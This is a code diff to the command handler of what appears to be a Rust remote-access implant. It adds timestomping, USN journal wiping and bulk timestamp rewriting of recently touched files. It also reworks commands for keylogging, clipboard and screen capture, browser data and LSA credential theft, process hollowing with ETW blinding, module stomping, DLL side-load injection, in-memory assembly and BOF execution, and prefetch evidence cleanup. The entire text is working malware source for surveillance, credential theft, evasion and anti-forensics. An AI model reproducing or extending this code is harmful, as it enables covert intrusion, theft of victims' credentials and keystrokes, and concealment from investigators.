@@ -61,6 +61,94 @@ lazy_static! {
         Mutex::new(HashMap::new());
 }
 
+#[cfg(all(windows, feature = "forensic-cleanup"))]
+lazy_static! {
+    static ref SESSION_START_TIME: std::time::SystemTime = std::time::SystemTime::now();
+}
+
+#[cfg(all(windows, feature = "forensic-cleanup"))]
+fn to_nt_wide_path(path: &str) -> Vec<u16> {
+    if path.starts_with('\\') {
+        path.encode_utf16().chain(std::iter::once(0)).collect()
+    } else {
+        format!("\\??\\{path}")
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect()
+    }
+}
+
+#[cfg(all(windows, feature = "forensic-cleanup"))]
+fn collect_recent_files_for_sync(
+    roots: &[String],
+    since: std::time::SystemTime,
+    max_files: usize,
+) -> Result<Vec<String>, String> {
+    const MAX_DIR_VISITS: usize = 50_000;
+
+    let mut queue = std::collections::VecDeque::new();
+    for root in roots {
+        if !root.trim().is_empty() {
+            queue.push_back(std::path::PathBuf::from(root));
+        }
+    }
+
+    let mut dir_visits = 0usize;
+    let mut files = Vec::new();
+
+    while let Some(path) = queue.pop_front() {
+        if files.len() >= max_files {
+            break;
+        }
+
+        let meta = match std::fs::symlink_metadata(&path) {
+            Ok(m) => m,
+            Err(_) => continue,
+        };
+
+        let file_type = meta.file_type();
+        if file_type.is_symlink() {
+            continue;
+        }
+
+        if meta.is_dir() {
+            dir_visits += 1;
+            if dir_visits > MAX_DIR_VISITS {
+                break;
+            }
+
+            let read_dir = match std::fs::read_dir(&path) {
+                Ok(rd) => rd,
+                Err(_) => continue,
+            };
+            for entry in read_dir.flatten() {
+                queue.push_back(entry.path());
+            }
+            continue;
+        }
+
+        if !meta.is_file() {
+            continue;
+        }
+
+        let is_recent = match meta.modified() {
+            Ok(modified) => modified.duration_since(since).is_ok(),
+            Err(_) => false,
+        };
+
+        if is_recent {
+            files.push(path.to_string_lossy().to_string());
+        }
+    }
+
+    files.sort_unstable();
+    files.dedup();
+    if files.len() > max_files {
+        files.truncate(max_files);
+    }
+    Ok(files)
+}
+
 fn sanitize_action(cmd: &Command) -> String {
     match cmd {
         Command::WriteFile { path, .. } => format!("WriteFile(path={path:?})"),
@@ -162,7 +250,10 @@ pub async fn handle_command(
     let action = sanitize_action(&command);
 
     let mut result_data: Option<Vec<u8>> = None;
-    let result: Result<String, String> = match command {
+    // Match on a cloned command so feature-gated branches can destructure
+    // owned fields without invalidating later audit/sanitization paths that
+    // still need to borrow `command`.
+    let result: Result<String, String> = match command.clone() {
         Command::Ping => Ok("pong".to_string()),
         Command::GetSystemInfo => handle_system_info(),
         Command::RunApprovedScript { ref script } => handle_run_approved_script(script),
@@ -413,18 +504,19 @@ pub async fn handle_command(
 
         Command::MigrateAgent { target_pid } => {
             if target_pid == 0 {
-                return Err("invalid target PID: 0".to_string());
+                Err("invalid target PID: 0".to_string())
+            } else {
+                let current_pid = std::process::id();
+                if target_pid == current_pid {
+                    Err("cannot migrate to self".to_string())
+                } else if target_pid == 4 {
+                    Err("cannot migrate to System process".to_string())
+                } else {
+                    crate::process_manager::migrate_to_process(target_pid)
+                        .map(|_| "Migration completed".to_string())
+                        .map_err(|e| e.to_string())
+                }
             }
-            let current_pid = std::process::id();
-            if target_pid == current_pid {
-                return Err("cannot migrate to self".to_string());
-            }
-            if target_pid == 4 {
-                return Err("cannot migrate to System process".to_string());
-            }
-            crate::process_manager::migrate_to_process(target_pid)
-                .map(|_| "Migration completed".to_string())
-                .map_err(|e| e.to_string())
         }
 
         #[cfg(feature = "self-reencode")]
@@ -458,19 +550,32 @@ pub async fn handle_command(
             Err("self-reencode feature not enabled".to_string())
         }
 
-        /// SetSleepVariant: switch the sleep obfuscation variant at runtime.
-        /// Accepted values: "cronus", "ekko".
-        Command::SetSleepVariant { variant } => {
-            let v = match variant.to_lowercase().as_str() {
-                "cronus" => crate::sleep_obfuscation::SleepVariant::Cronus,
-                "ekko" => crate::sleep_obfuscation::SleepVariant::Ekko,
+        // SetSleepVariant: switch the sleep obfuscation variant at runtime.
+        // Accepted values: "cronus", "ekko".
+        #[cfg(windows)]
+        Command::SetSleepVariant { ref variant } => {
+            match variant.to_lowercase().as_str() {
+                "cronus" => {
+                    crate::sleep_obfuscation::set_sleep_variant(
+                        crate::sleep_obfuscation::SleepVariant::Cronus,
+                    );
+                    Ok(format!("Sleep variant set to {variant}"))
+                }
+                "ekko" => {
+                    crate::sleep_obfuscation::set_sleep_variant(
+                        crate::sleep_obfuscation::SleepVariant::Ekko,
+                    );
+                    Ok(format!("Sleep variant set to {variant}"))
+                }
                 other => {
                     log::warn!("unknown sleep variant '{other}', ignoring");
-                    return Err(format!("unknown sleep variant: {other}"));
+                    Err(format!("unknown sleep variant: {other}"))
                 }
-            };
-            crate::sleep_obfuscation::set_sleep_variant(v);
-            Ok(format!("Sleep variant set to {variant}"))
+            }
+        }
+        #[cfg(not(windows))]
+        Command::SetSleepVariant { .. } => {
+            Err("sleep obfuscation variant switching is only supported on Windows".to_string())
         }
 
         #[cfg(feature = "persistence")]
@@ -824,13 +929,17 @@ pub async fn handle_command(
         }
         Command::MeshQuarantine { ref target_agent_id, reason } => {
             let mut mesh_guard = p2p_mesh.lock().await;
-            mesh_guard.quarantine_peer(target_agent_id, reason);
-            Ok(format!("agent '{}' quarantined (reason={})", target_agent_id, reason))
+            match mesh_guard.quarantine_peer(target_agent_id, reason) {
+                Ok(()) => Ok(format!("agent '{}' quarantined (reason={})", target_agent_id, reason)),
+                Err(e) => Err(format!("MeshQuarantine failed: {e}")),
+            }
         }
         Command::MeshClearQuarantine { ref target_agent_id } => {
             let mut mesh_guard = p2p_mesh.lock().await;
-            mesh_guard.clear_quarantine(target_agent_id);
-            Ok(format!("quarantine cleared for agent '{}'", target_agent_id))
+            match mesh_guard.clear_quarantine(target_agent_id) {
+                Ok(()) => Ok(format!("quarantine cleared for agent '{}'", target_agent_id)),
+                Err(e) => Err(format!("MeshClearQuarantine failed: {e}")),
+            }
         }
         Command::MeshSetCompartment { ref compartment } => {
             let mut mesh_guard = p2p_mesh.lock().await;
@@ -841,7 +950,7 @@ pub async fn handle_command(
         // ── In-process .NET assembly execution (Windows only) ───────────
         #[cfg(windows)]
         Command::ExecuteAssembly { ref data, ref args, timeout_secs } => {
-            match super::assembly_loader::execute(data, args, timeout_secs) {
+            match unsafe { super::assembly_loader::execute(data, args, timeout_secs) } {
                 Ok(result) => {
                     let output_len = result.output.len();
                     result_data = Some(result.output.into_bytes());
@@ -866,7 +975,7 @@ pub async fn handle_command(
         // ── BOF / COFF loader (Windows only) ────────────────────────────
         #[cfg(windows)]
         Command::ExecuteBOF { ref data, ref args, timeout_secs } => {
-            match super::coff_loader::execute_bof(data, args, timeout_secs) {
+            match unsafe { super::coff_loader::execute_bof(data, args, timeout_secs) } {
                 Ok(result) => {
                     let output_len = result.output.len();
                     result_data = Some(result.output.into_bytes());
@@ -916,7 +1025,6 @@ pub async fn handle_command(
 
         #[cfg(feature = "surveillance")]
         Command::Screenshot { monitor } => {
-            let key_bytes = *crypto.key_bytes();
             match crate::surveillance::capture_screenshot(monitor) {
                 Ok(png_bytes) => {
                     result_data = Some(png_bytes);
@@ -932,7 +1040,7 @@ pub async fn handle_command(
 
         #[cfg(feature = "surveillance")]
         Command::KeyloggerStart => {
-            let key_bytes = *crypto.key_bytes();
+            let key_bytes = crypto.key_bytes();
             match crate::surveillance::start_keylogger(key_bytes) {
                 Ok(()) => Ok("keylogger started".to_string()),
                 Err(e) => Err(format!("keylogger start failed: {e}")),
@@ -945,7 +1053,7 @@ pub async fn handle_command(
 
         #[cfg(feature = "surveillance")]
         Command::KeyloggerDump { clear } => {
-            let key_bytes = *crypto.key_bytes();
+            let key_bytes = crypto.key_bytes();
             match crate::surveillance::dump_keylogger(key_bytes, clear) {
                 Ok(encrypted) => {
                     result_data = Some(encrypted);
@@ -973,7 +1081,7 @@ pub async fn handle_command(
 
         #[cfg(feature = "surveillance")]
         Command::ClipboardMonitorStart { interval_ms } => {
-            let key_bytes = *crypto.key_bytes();
+            let key_bytes = crypto.key_bytes();
             match crate::surveillance::start_clipboard_monitor(key_bytes, interval_ms) {
                 Ok(()) => Ok("clipboard monitor started".to_string()),
                 Err(e) => Err(format!("clipboard monitor start failed: {e}")),
@@ -986,7 +1094,7 @@ pub async fn handle_command(
 
         #[cfg(feature = "surveillance")]
         Command::ClipboardMonitorDump { clear } => {
-            let key_bytes = *crypto.key_bytes();
+            let key_bytes = crypto.key_bytes();
             match crate::surveillance::dump_clipboard(key_bytes, clear) {
                 Ok(encrypted) => {
                     result_data = Some(encrypted);
@@ -1027,13 +1135,13 @@ pub async fn handle_command(
         // ── Browser data recovery ─────────────────────────────────────
 
         #[cfg(all(windows, feature = "browser-data"))]
-        Command::BrowserData { browser, data_type } => {
+        Command::BrowserData { ref browser, ref data_type } => {
             // Set C4 timeout from config before calling browser_data.
             {
                 let cfg = config.lock().await;
                 crate::browser_data::set_c4_timeout(cfg.browser_c4_timeout_secs);
             }
-            match crate::browser_data::collect_browser_data(browser, data_type) {
+            match crate::browser_data::collect_browser_data(browser.clone(), data_type.clone()) {
                 Ok(json) => {
                     result_data = Some(json.into_bytes());
                     Ok("browser data collected".to_string())
@@ -1066,7 +1174,7 @@ pub async fn handle_command(
         // ── LSA Whisperer — SSP interface credential extraction ────────
 
         #[cfg(all(windows, feature = "lsa-whisperer"))]
-        Command::HarvestLSA { method } => {
+        Command::HarvestLSA { ref method } => {
             let timeout = config.lock().await.lsa_whisperer.timeout_secs;
             match crate::lsa_whisperer::harvest_lsa(&method, timeout) {
                 Ok(json) => {
@@ -1328,14 +1436,18 @@ pub async fn handle_command(
 
         /// NTFS transaction-based process hollowing with ETW blinding.
         #[cfg(feature = "transacted-hollowing")]
-        Command::TransactedHollow { target_process, payload, etw_blinding } => {
+        Command::TransactedHollow {
+            ref target_process,
+            ref payload,
+            etw_blinding,
+        } => {
             let rollback_timeout_ms = {
                 let cfg = config.lock().await.clone();
                 cfg.transacted_hollowing.rollback_timeout_ms
             };
             match unsafe {
                 crate::injection_transacted::inject_transacted_hollowing(
-                    &payload,
+                    payload.as_slice(),
                     etw_blinding,
                     rollback_timeout_ms,
                 )
@@ -1345,8 +1457,8 @@ pub async fn handle_command(
                     // for the target process.  Best-effort, non-blocking.
                     #[cfg(all(windows, feature = "forensic-cleanup"))]
                     crate::forensic_cleanup::prefetch::auto_clean_after_injection(
-                        target_process.as_deref().unwrap_or(""
-                    ));
+                        target_process,
+                    );
                     match serde_json::to_string_pretty(&serde_json::json!({
                         "pid": handle.target_pid,
                         "base_addr": format!("{:#x}", handle.injected_base_addr),
@@ -1372,35 +1484,39 @@ pub async fn handle_command(
         // the payload.  Returns immediately after Phase 1 (DLL load);
         // Phase 2 (stomp + execute) runs in a background thread.
         #[cfg(feature = "delayed-stomp")]
-        Command::DelayedStomp { target_pid, payload, delay_secs } => {
-            let (min_delay, max_delay) = {
-                let cfg = config.lock().await.clone();
-                let d = &cfg.delayed_stomp;
-                if !d.enabled {
-                    return Err("delayed-stomp is disabled in config".to_string());
-                }
-                if let Some(secs) = delay_secs {
-                    (*secs, *secs)
+        Command::DelayedStomp {
+            target_pid,
+            ref payload,
+            delay_secs,
+        } => {
+            let cfg = config.lock().await.clone();
+            let d = &cfg.delayed_stomp;
+            if !d.enabled {
+                Err("delayed-stomp is disabled in config".to_string())
+            } else {
+                let (min_delay, max_delay) = if let Some(secs) = delay_secs {
+                    (secs, secs)
                 } else {
                     (d.min_delay_secs, d.max_delay_secs)
+                };
+
+                match crate::injection_delayed_stomp::inject_delayed_stomp_async(
+                    target_pid,
+                    payload.clone(),
+                    min_delay,
+                    max_delay,
+                ) {
+                    Ok(json) => {
+                        // Post-injection hook: auto-clean prefetch evidence
+                        // for the target process.  Best-effort, non-blocking.
+                        #[cfg(all(windows, feature = "forensic-cleanup"))]
+                        crate::forensic_cleanup::prefetch::auto_clean_after_injection(
+                            &format!("pid:{}", target_pid),
+                        );
+                        Ok(json)
+                    }
+                    Err(e) => Err(format!("delayed stomp failed: {e}")),
                 }
-            };
-            match crate::injection_delayed_stomp::inject_delayed_stomp_async(
-                *target_pid,
-                payload.clone(),
-                min_delay,
-                max_delay,
-            ) {
-                Ok(json) => {
-                    // Post-injection hook: auto-clean prefetch evidence
-                    // for the target process.  Best-effort, non-blocking.
-                    #[cfg(all(windows, feature = "forensic-cleanup"))]
-                    crate::forensic_cleanup::prefetch::auto_clean_after_injection(
-                        &format!("pid:{}", target_pid)
-                    );
-                    Ok(json)
-                }
-                Err(e) => Err(format!("delayed stomp failed: {e}")),
             }
         }
         #[cfg(not(feature = "delayed-stomp"))]
@@ -1414,10 +1530,10 @@ pub async fn handle_command(
         // and executes via NtCreateThreadEx.  Produces a side-loaded DLL
         // with a legitimate export table in memory.
         #[cfg(windows)]
-        Command::InjectSideLoad { pid, payload, export_config } => {
+        Command::InjectSideLoad { pid, ref payload, ref export_config } => {
             use crate::injection::dll_sideload::DllSideLoadInjector;
             let injector = DllSideLoadInjector;
-            match injector.inject_with_export_forwarding(*pid, payload, export_config) {
+            match injector.inject_with_export_forwarding(pid, payload, export_config) {
                 Ok(()) => {
                     match serde_json::to_string_pretty(&serde_json::json!({
                         "pid": pid,
@@ -1445,55 +1561,57 @@ pub async fn handle_command(
         // and fallback chains across all 12 technique variants.
         #[cfg(windows)]
         Command::UnifiedInject {
-            target_process,
-            payload,
-            technique,
+            ref target_process,
+            ref payload,
+            ref technique,
             evade,
         } => {
             let parsed_technique = match technique.as_deref() {
-                None | Some("auto") => None,
-                Some(name) => {
-                    match crate::injection_engine::parse_technique(name) {
-                        Ok(t) => Some(t),
-                        Err(e) => return Err(format!("invalid technique {:?}: {e}", technique)),
+                None | Some("auto") => Ok(None),
+                Some(name) => crate::injection_engine::parse_technique(name)
+                    .map(Some)
+                    .map_err(|e| format!("invalid technique {:?}: {e}", technique)),
+            };
+
+            match parsed_technique {
+                Err(e) => Err(e),
+                Ok(parsed_technique) => {
+                    let config = crate::injection_engine::InjectionConfig {
+                        technique: parsed_technique,
+                        target_process: target_process.clone(),
+                        payload: payload.clone(),
+                        prefer_same_arch: true,
+                        evade_etw: evade,
+                        timeout_ms: 30_000,
+                    };
+
+                    let result = if evade {
+                        crate::injection_engine::evasiveness_inject(config)
+                    } else {
+                        crate::injection_engine::inject(config)
+                    };
+
+                    match result {
+                        Ok(handle) => {
+                            // Post-injection hook: auto-clean prefetch evidence.
+                            #[cfg(feature = "forensic-cleanup")]
+                            crate::forensic_cleanup::prefetch::auto_clean_after_injection(
+                                target_process.as_str()
+                            );
+                            match serde_json::to_string_pretty(&serde_json::json!({
+                                "pid": handle.target_pid,
+                                "base_addr": format!("{:#x}", handle.injected_base_addr),
+                                "technique": format!("{:?}", handle.technique_used),
+                                "payload_size": handle.payload_size,
+                                "sleep_enrolled": handle.sleep_enrolled,
+                            })) {
+                                Ok(json) => Ok(json),
+                                Err(e) => Err(format!("serialization failed: {e}")),
+                            }
+                        }
+                        Err(e) => Err(format!("unified inject failed: {:?}", e)),
                     }
                 }
-            };
-
-            let config = crate::injection_engine::InjectionConfig {
-                technique: parsed_technique,
-                target_process: target_process.clone(),
-                payload: payload.clone(),
-                prefer_same_arch: true,
-                evade_etw: *evade,
-                timeout_ms: 30_000,
-            };
-
-            let result = if *evade {
-                crate::injection_engine::evasiveness_inject(config)
-            } else {
-                crate::injection_engine::inject(config)
-            };
-
-            match result {
-                Ok(handle) => {
-                    // Post-injection hook: auto-clean prefetch evidence.
-                    #[cfg(feature = "forensic-cleanup")]
-                    crate::forensic_cleanup::prefetch::auto_clean_after_injection(
-                        target_process.as_str()
-                    );
-                    match serde_json::to_string_pretty(&serde_json::json!({
-                        "pid": handle.target_pid,
-                        "base_addr": format!("{:#x}", handle.injected_base_addr),
-                        "technique": format!("{:?}", handle.technique_used),
-                        "payload_size": handle.payload_size,
-                        "sleep_enrolled": handle.sleep_enrolled,
-                    })) {
-                        Ok(json) => Ok(json),
-                        Err(e) => Err(format!("serialization failed: {e}")),
-                    }
-                }
-                Err(e) => Err(format!("unified injection failed: {e}")),
             }
         }
         #[cfg(not(windows))]
@@ -1646,6 +1764,165 @@ pub async fn handle_command(
             Err("forensic-cleanup feature not enabled".to_string())
         }
 
+        // Synchronize timestamps for a single file using either the explicit
+        // reference file or the configured default reference.
+        #[cfg(all(windows, feature = "forensic-cleanup"))]
+        Command::Timestomp {
+            file_path,
+            reference_file,
+        } => {
+            let to_nt_wide = |path: &str| -> Vec<u16> {
+                if path.starts_with('\\') {
+                    path.encode_utf16().chain(std::iter::once(0)).collect()
+                } else {
+                    format!("\\??\\{path}")
+                        .encode_utf16()
+                        .chain(std::iter::once(0))
+                        .collect()
+                }
+            };
+
+            let file_nt = to_nt_wide(file_path);
+            if reference_file.trim().is_empty() {
+                unsafe {
+                    crate::forensic_cleanup::timestamps::sync_timestamps_with_default_ref(&file_nt)
+                }
+                .map(|_| "Timestomp complete".to_string())
+            } else {
+                let reference_nt = to_nt_wide(reference_file);
+                unsafe { crate::forensic_cleanup::timestamps::sync_timestamps(&file_nt, &reference_nt) }
+                    .map(|_| "Timestomp complete".to_string())
+            }
+        }
+        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
+        Command::Timestomp { .. } => {
+            Err("forensic-cleanup feature not enabled".to_string())
+        }
+
+        #[cfg(all(windows, feature = "forensic-cleanup"))]
+        Command::TimestompDirectory {
+            dir_path,
+            reference_file,
+        } => {
+            let to_nt_wide = |path: &str| -> Vec<u16> {
+                if path.starts_with('\\') {
+                    path.encode_utf16().chain(std::iter::once(0)).collect()
+                } else {
+                    format!("\\??\\{path}")
+                        .encode_utf16()
+                        .chain(std::iter::once(0))
+                        .collect()
+                }
+            };
+
+            let dir_nt = to_nt_wide(dir_path);
+            let reference = if reference_file.trim().is_empty() {
+                config.lock().await.timestamps.reference_file.clone()
+            } else {
+                reference_file.clone()
+            };
+            let reference_nt = to_nt_wide(&reference);
+
+            unsafe {
+                crate::forensic_cleanup::timestamps::timestomp_directory(&dir_nt, &reference_nt)
+            }
+            .map(|count| format!("Timestomped {count} files"))
+        }
+        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
+        Command::TimestompDirectory { .. } => {
+            Err("forensic-cleanup feature not enabled".to_string())
+        }
+
+        #[cfg(all(windows, feature = "forensic-cleanup"))]
+        Command::CleanUsn { volume } => {
+            let to_nt_wide = |path: &str| -> Vec<u16> {
+                if path.starts_with('\\') {
+                    path.encode_utf16().chain(std::iter::once(0)).collect()
+                } else {
+                    format!("\\??\\{path}")
+                        .encode_utf16()
+                        .chain(std::iter::once(0))
+                        .collect()
+                }
+            };
+
+            let vol = if volume.trim().is_empty() {
+                "C:".to_string()
+            } else {
+                volume.clone()
+            };
+            let volume_nt = to_nt_wide(&vol);
+            unsafe { crate::forensic_cleanup::timestamps::clean_usn_journal(&volume_nt) }
+                .map(|_| format!("USN cleanup completed for {vol}"))
+        }
+        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
+        Command::CleanUsn { .. } => {
+            Err("forensic-cleanup feature not enabled".to_string())
+        }
+
+        #[cfg(all(windows, feature = "forensic-cleanup"))]
+        Command::SyncTimestamps => {
+            const MAX_SYNC_CANDIDATES: usize = 512;
+
+            let cfg = config.lock().await.clone();
+            if !cfg.timestamps.enabled {
+                Err("forensic timestamp synchronization is disabled in config".to_string())
+            } else {
+                let roots = cfg.allowed_paths.clone();
+                let since = *SESSION_START_TIME;
+
+                match tokio::task::spawn_blocking(move || {
+                    collect_recent_files_for_sync(&roots, since, MAX_SYNC_CANDIDATES)
+                })
+                .await
+                {
+                    Ok(Ok(candidates)) => {
+                        if candidates.is_empty() {
+                            Ok("SyncTimestamps: no recently modified files found in allowed paths".to_string())
+                        } else {
+                            let mut synced = 0usize;
+                            let mut failed = Vec::new();
+
+                            for file in &candidates {
+                                let file_nt = to_nt_wide_path(file);
+                                match unsafe {
+                                    crate::forensic_cleanup::timestamps::sync_timestamps_with_default_ref(&file_nt)
+                                } {
+                                    Ok(()) => synced += 1,
+                                    Err(e) => failed.push(format!("{} ({})", file, e)),
+                                }
+                            }
+
+                            if failed.is_empty() {
+                                Ok(format!(
+                                    "SyncTimestamps: synchronized {} recently modified file(s)",
+                                    synced
+                                ))
+                            } else if synced == 0 {
+                                Err(format!(
+                                    "SyncTimestamps failed for all {} candidate file(s): {}",
+                                    failed.len(),
+                                    failed.into_iter().take(3).collect::<Vec<_>>().join("; ")
+                                ))
+                            } else {
+                                Ok(format!(
+                                    "SyncTimestamps: synchronized {} file(s), {} failed",
+                                    synced,
+                                    failed.len()
+                                ))
+                            }
+                        }
+                    }
+                    Ok(Err(e)) => Err(format!("SyncTimestamps scan failed: {e}")),
+                    Err(e) => Err(format!("SyncTimestamps worker task failed: {e}")),
+                }
+            }
+        }
+        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
+        Command::SyncTimestamps => {
+            Err("forensic-cleanup feature not enabled".to_string())
+        }
+
         // ── Page Tracker telemetry gateway ──────────────────────────────
         // PageTrackerStatus is the only authorized way to query page
         // tracker state from outside the crate.  The underlying
@@ -1681,12 +1958,16 @@ pub async fn handle_command(
         // Skip auto-revert for RevertToken, ListTokens, and forensic
         // cleanup commands — these don't use impersonation tokens and
         // shouldn't disrupt a token set up for subsequent operations.
-        match command {
+        match &command {
             Command::RevertToken
             | Command::ListTokens
             | Command::CleanPrefetch { .. }
             | Command::DisablePrefetch
-            | Command::RestorePrefetch => {}
+            | Command::RestorePrefetch
+            | Command::Timestomp { .. }
+            | Command::TimestompDirectory { .. }
+            | Command::CleanUsn { .. }
+            | Command::SyncTimestamps => {}
             _ => crate::token_impersonation::auto_revert(),
         }
     }
